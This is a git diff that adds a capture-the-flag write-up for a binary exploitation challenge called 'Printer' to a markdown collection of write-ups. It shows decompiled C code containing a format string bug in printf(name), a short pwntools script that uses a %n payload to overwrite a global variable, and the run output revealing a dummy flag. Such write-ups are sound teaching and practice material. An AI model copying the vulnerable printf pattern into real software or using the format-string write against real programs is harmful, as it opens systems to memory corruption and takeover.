@@ -14,7 +14,8 @@
 - Android
 	- [Decode](https://github.com/abhaynayar/ctf/blob/master/writeups/inctfn19.md#decode-200-pts)
 	- [Secret Service](https://github.com/abhaynayar/ctf/blob/master/writeups/inctfn19.md#secret-service-200-pts)
-
+- Binary Exploitation
+	- [Printer]()
 
 ## Reverse Engineering
 
@@ -269,4 +270,64 @@ inctf{nev3r_st0re_s3ns!tiv3_data_1n_7h3_s0urcec0de}
 
 ### Secret Service 200 pts.
 
+## Binary Exploitation
 
+### Printer
+
+We get a binary ```chall``` after decompiling and cleaning it up it looks somewhat like this:
+
+```
+#include <stdio.h>
+#include <fstream.h>
+
+int Overwrite_Me = 0;
+
+int main() {
+
+  printf("Please enter your name : ");
+  scanf("%s",name);
+  printf("Welcome Mr. ");
+  printf(name);
+
+  if (Overwrite_Me == 0xcafe) {
+    flag_file = fopen("flag","r");
+    if (flag_file == (FILE *)0x0) {
+      printf("Flag file not Found.\nContact the administrator.");
+    }   
+    else {
+      char flag[50];
+      fgets(flag, 50, flag_file);
+      printf("You deserve this.\nHere, take you flag %s",flag);
+    }   
+  }
+  printf("Sorry it is not your day");
+  exit(0);
+}
+
+```
+
+We see that this program requires us to change the value of ```Overwrite_Me``` to ```0xcafe``` using the format string vulnerability on ```printf(name)```. After analyzing the file with gdb I figured out that the buffer starts 20 offsets from the first stack pop. Using that and the padding notation in format strings, I came up with the following exploit script.
+
+```
+from pwn import *
+
+
+payload = p32(0x0804c040); #Overwrite_Me
+payload += "%51961x.%20$n"
+
+print payload
+```
+
+I wasn't able to solve this challenge during the CTF, but I managed to solve it pretty quick when I got back :(
+
+```
+$ python exploit.py | ./chall
+Please enter your name : Welcome Mr. @�
+
+-snip-
+
+                    ff867be0.
+You deserve this.
+Here, take you flag inctf{this_is_a_dummy_flag}
+
+```
